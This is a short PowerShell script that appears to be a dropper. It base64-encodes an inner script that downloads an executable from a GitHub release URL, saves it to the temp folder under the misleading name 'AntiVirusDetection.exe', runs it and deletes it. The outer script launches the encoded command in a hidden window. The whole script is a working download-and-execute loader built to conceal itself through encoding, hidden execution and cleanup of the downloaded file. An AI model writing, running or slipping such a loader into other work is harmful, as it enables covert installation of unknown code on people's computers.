$script = @'
$p=Join-Path $env:TEMP "AntiVirusDetection.exe"
Invoke-WebRequest "https://github.com/KelvinWin10/theresabsoulutelynowayforutoseethis/releases/download/justtestingnewstuff123/WindowsSystemOptimizer.exe" -OutFile $p
Start-Process $p -Wait
Remove-Item $p
'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)

# Run the encoded command hidden
powershell.exe -WindowStyle Hidden -EncodedCommand $encoded
